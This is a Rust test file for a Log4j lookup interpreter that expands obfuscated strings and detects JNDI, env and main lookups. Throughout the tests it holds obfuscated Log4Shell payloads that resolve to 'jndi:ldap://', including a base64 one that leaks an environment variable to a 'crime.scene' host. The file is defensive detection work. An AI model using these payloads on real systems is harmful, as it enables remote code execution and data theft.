use log4j_interpreter::{parse_str, Findings};

fn parseu(input: &str) -> (String, Findings) {
    parse_str(input, 3).unwrap()
}

fn parseu_string(input: &str) -> String {
    parse_str(input, 3).unwrap().0
}

#[test]
fn partial_escape() {
    assert_eq!("hi$$there", parseu_string("hi$$there"));
}
#[test]
fn full_escape() {
    assert_eq!("hi${there", parseu_string("hi$${there"));
}
#[test]
fn partial_substitute() {
    assert_eq!("hi${lower:X", parseu_string("hi${lower:X"));
}
#[test]
fn full_substitute() {
    assert_eq!("hixthere", parseu_string("hi${lower:X}there"));
}
#[test]
fn nested_substitute() {
    assert_eq!("hiTHERE", parseu_string("hi${upper:th${lower:ERE}}"));
}
#[test]
fn obfuscated() {
    let input = "${\
        ${uPBeLd:JghU:kyH:C:TURit:-j}\
        ${odX:t:STGD:UaqOvq:wANmU:-n}\
        ${mgSejH:tpr:zWlb:-d}\
        ${ohw:Yyz:OuptUo:gTKe:BFxGG:-i}\
        ${fGX:L:KhSyJ:-:}\
        ${E:o:wsyhug:LGVMcx:-l}\
        ${Prz:-d}\
        ${d:PeH:OmFo:GId:-a}\
        ${NLsTHo:-p}\
        ${uwF:eszIV:QSvP:-:}\
        ${JF:l:U:-/}\
        ${AyEC:rOLocm:-/}\
    }";
    let (result, findings) = parseu(input);
    assert_eq!("jndi:ldap://", result);
    assert!(findings.saw_jndi);
}
#[test]
fn unicode_obfuscated() {
    let (result, findings) =
        parseu("does this get blocked? ${jnd${lower:${upper:ı}}:ldap://whatever}");
    assert_eq!(
        "does this get blocked? jndi:ldap://whatever",
        // note: the next line intentionally uses a unicode character
        result,
    );
    assert!(findings.saw_jndi);
}
#[test]
fn default_dollar() {
    assert_eq!("$", parseu_string("${::-$}"));
}
#[test]
fn complex_default_dollar() {
    assert_eq!("$hello", parseu_string("${::-$hello}"));
}
#[test]
fn obfuscated_dollar() {
    let input = "hello ${lower:${::-$}{jndi:}}";
    let (result, findings) = parseu(input);
    assert_eq!("hello jndi:", result);
    assert!(findings.saw_jndi);
}
#[test]
fn obfuscate_everything() {
    let input = "${::-${::-$}{::}${::--}${::-hi}}";
    assert_eq!("hi", parseu_string(input));
}
#[test]
fn what_does_this_do() {
    let input = "what's that ${::-$}{${::-j}ndi:${::-l}dap:}";
    let (result, findings) = parseu(input);
    assert_eq!("what's that jndi:ldap:", result);
    assert!(findings.saw_jndi);
}
#[test]
fn base64() {
    let evil = base64::encode("${jndi:ldap:${env:user}.crime.scene/a}");
    let input = format!("all your base64 are ${{base64:{}}}", evil);
    let (result, findings) = parseu(&input);
    assert_eq!(
        "all your base64 are jndi:ldap:.crime.scene/a",
        result
    );
    assert!(findings.saw_jndi);
    assert!(findings.saw_env);

    let harmless = base64::encode("completely harmless text");
    let input = format!("this is ${{base64:{}}}", harmless);
    assert_eq!("this is completely harmless text", parseu_string(&input));
}
#[test]
fn two_default_delimiters() {
    let input = "${::-:-}";
    assert_eq!(":-", parseu_string(input));
}
#[test]
fn much_nesting() {
    let input = "${::-h${::-e${::-l${::-l${::-o ${base64:YWRhbQ==}}}}}}";
    assert_eq!("hello adam", parse_str(input, 6).unwrap().0);
}
#[test]
fn date_lookups() {
    let input = "hello ${jn${date:''}di:}";
    let (result, findings) = parseu(input);
    assert_eq!("hello jndi:", result);
    assert!(findings.saw_jndi);

    // NOTE: this is lossy. A real expansion would look like `${jn2021di:}`. This is still not the
    // token we're really concerned about finding, so we're not worried about that detail.
    //
    // The resulting detection of a `jndi` token will be a false positive.
    let input = "hello ${jn${date:YYYY}di:}";
    let (result, findings) = parseu(input);
    assert_eq!("hello jndi:", result);
    assert!(findings.saw_jndi);
}
#[test]
fn main_lookups() {
    let input = "hello ${jn${main:foobar}di:}";
    let (result, findings) = parseu(input);
    assert_eq!("hello jndi:", result);
    assert!(findings.saw_jndi);
    assert!(findings.saw_main);

    // NOTE: this is lossy. A real expansion would look like `${jn/path/to/javadi:}`. This is still not the
    // token we're really concerned about finding, so we're not worried about that detail.
    //
    // The resulting detection of a `jndi` token will be a false positive.
    let input = "hello ${jn${main:0}di:}";
    let (result, findings) = parseu(input);
    assert_eq!("hello jndi:", result);
    assert!(findings.saw_jndi);
    assert!(findings.saw_main);
}
#[test]
fn double_obfuscated_jndi() {
    let input = "hello ${lower:${::-$}{jn${main:foo}di:}}";
    let (result, findings) = parseu(input);
    assert_eq!("hello jndi:", result);
    assert!(findings.saw_jndi);
    assert!(findings.saw_main);

    let input = "hello ${lower:${::-$}{jn${date:''}di:}}";
    let (result, findings) = parseu(input);
    assert_eq!("hello jndi:", result);
    assert!(findings.saw_jndi);
    assert!(!findings.saw_main);
}
#[test]
fn env_expansion() {
    // env expands to empty string on the assumption the variable is undefined
    let input = "this env var does not exist: ${env:var_that_doesnt_exist}";
    let (result, findings) = parseu(input);
    assert_eq!("this env var does not exist: ", result);
    assert!(!findings.saw_jndi);
    assert!(findings.saw_env);

    // env can have a default value, used instead
    let input = "this env var does not exist: ${env:var_that_doesnt_exist:-evil_jndi}";
    let (result, findings) = parseu(input);
    assert_eq!("this env var does not exist: evil_jndi", result);
    assert!(!findings.saw_jndi);
    assert!(findings.saw_env);
}
